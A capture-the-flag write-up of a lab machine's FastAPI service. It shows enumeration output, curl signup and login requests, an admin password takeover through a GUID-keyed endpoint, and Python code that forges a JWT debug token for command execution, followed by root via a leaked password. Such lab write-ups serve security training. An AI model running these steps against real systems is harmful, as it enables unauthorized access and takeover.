# Enumeration 
Nmap scan revealed there were 2 open ports (22/80), so I figured this would be a web-based exploit to gain credentials then some sort of LPE once a shell was gained through SSH.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    uvicorn
```

## 80/tcp uvicorn
Initial recon of this service revealed it was hosting a web-based API *"UHC API Version 1.0"* 

Okay, simple enough, let's enumerate to discover API endpoints for possible exploitation.
```
Target: http://10.10.11.161/

[10:50:08] Starting: 
[10:50:24] 200 -   20B  - /api                                              
[10:50:24] 307 -    0B  - /api/  ->  http://10.10.11.161/api                
[10:50:24] 200 -   30B  - /api/v1                                           
[10:50:29] 401 -   30B  - /docs                                             
[10:50:29] 307 -    0B  - /docs/  ->  http://10.10.11.161/docs
``` 
I tried to access /docs but it required authentication. Next I took a look at /api/v1 and discovered two additional endpoints that were not revealed with dirsearch: user & admin.
![9b68994eae64fc2d51e9063ab5ed7c60.png](../_resources/9b68994eae64fc2d51e9063ab5ed7c60.png)

During my initial recon into these endpoints, I ran into the issue that /api/v1/user was not found, but /api/v1/admin gave me an unauthenticated error. I did some research into API pentesting and consulted [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting) to find an article which led me in the right direction and I was able to find tons of information on users. I discovered the API used an integer value associated with each user which allowed me to further enumerate users and user information.
**/api/v1/user/1 output:**	
```
guid	"36c2e94a-4271-4259-93bf-c96ad5948284"
email	"admin@htb.local"
date	null
time_created	1649533388111
is_superuser	true
id	1
```

I got stuck for a while trying to enumerate the user endpoint manually, so I did some googling and figured I would try using feroxbuster to test / filter different HTTP methods and requests, and it revealed two endpoints which I was able to leverage to gain user privilege on the API.
```
422     POST        1l        3w      172c http://10.10.11.161/api/v1/user/login
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/1
422     POST        1l        2w       81c http://10.10.11.161/api/v1/user/signup
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/01
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/001
200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/0001
[####################] - 2m     60000/60000   0s      found:6       errors:0      
[####################] - 2m     60000/60000   345/s   http://10.10.11.161/api/v1/user
``` 

# User Access 
**/api/v1/user/signup** allowed me to create a new user, then login through **/api/v1/user/login** using the new credentials, giving access to an semi-unrestricted interactive FastAPI portal. 
**Register new user zig:**

```
curl -v -s -X POST -d '{"email": "zig@htb.htb", "password": "testpassword"}' http://10.10.11.161/api/v1/user/signup -H "Content-Type: application/json"
```

**Login with zig:**
```
curl -s -d 'username=zig@htb.htb&password=testpassword' http://10.10.11.161/api/v1/user/login
```

**Response:**
```
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU3ODI4OTI5LCJpYXQiOjE2NTcxMzc3MjksInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiMTJjZjk3NmEtNDNjMi00NTNlLWI1N2YtNjAyNGJmODljNzk3In0.Vpa9cAmcrC8mhQeGjrWozQmhPT6eLh-v6jnPMipHPs4",                                                                
  "token_type": "bearer"
}
```

![f09c6afb8a71a92ee06403e8bc217330.png](../_resources/f09c6afb8a71a92ee06403e8bc217330.png)

Once I was authenticated and had access to the frontend, I tried messing around with the API to see what endpoints I had access to and discovered the user flag and a very interesting endpoint that allowed me to update any user password by specifying a GUID, which we thankfully discovered during earlier enumeration. 
![5b494b7efa5e59d14ae9e34a55464a00.png](../_resources/5b494b7efa5e59d14ae9e34a55464a00.png)

**Login with admin thru API w/ curl**
```
curl -s -d 'username=admin@htb.local&password=password' http://10.10.11.161/api/v1/user/login
```

**Response**
```
{
	"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU3ODMzMzE4LCJpYXQiOjE2NTcxNDIxMTgsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.EJBTHaVgn45Gw-UxWGP0JSGnY2RSJylVWMFGkK_l6bk",
	"token_type":"bearer"
}
``` 

**Login thru web interface**
![66b10112af073523173a06149f84ed07.png](../_resources/66b10112af073523173a06149f84ed07.png)
![7b68a0d3364dc6cc0515d17bb37cc1e9.png](../_resources/7b68a0d3364dc6cc0515d17bb37cc1e9.png)

With the higher-privilege admin account I was able to read files like /etc/passwd but I still was limited in the way that I did not have full command execution privileges which was provided through a JWT debug token. Source code analysis revealed the JWT we currently have needed the debug key in order to use the **/exec** endpoint, and with a few lines of Python we had a forged debug key. 
```
>>> token = 'redacted'
>>> secret = 'redacted'
>>> decoded = jwt.decode(token, secret, ['HS256'])
>>> decoded
{'type': 'access_token', 'exp': 1657835375, 'iat': 1657144175, 'sub': '1', 'is_superuser': True, 'guid': '36c2e94a-4271-4259-93bf-c96ad5948284'}
>>> decoded["debug"] = True
>>> jwt.encode(decoded, secret, "HS256")
```

Base64 encode a bash reverse shell and boom we are in. Next step root.
![a174aa92be981065f61874cddd3f01ff.png](../_resources/a174aa92be981065f61874cddd3f01ff.png)
![5736deb3e83c302d7a0a0df09b0d924d.png](../_resources/5736deb3e83c302d7a0a0df09b0d924d.png)

# Root Access
Straightforward... a user accidentally entered their password as a username and we now have a cleartext password in auth.log
![aa428eaad1c1cf65d796f3818180a571.png](../_resources/aa428eaad1c1cf65d796f3818180a571.png)
su root and voila. rooted.
![80425a41c67af6539d5ce50ddc5c750f.png](../_resources/80425a41c67af6539d5ce50ddc5c750f.png)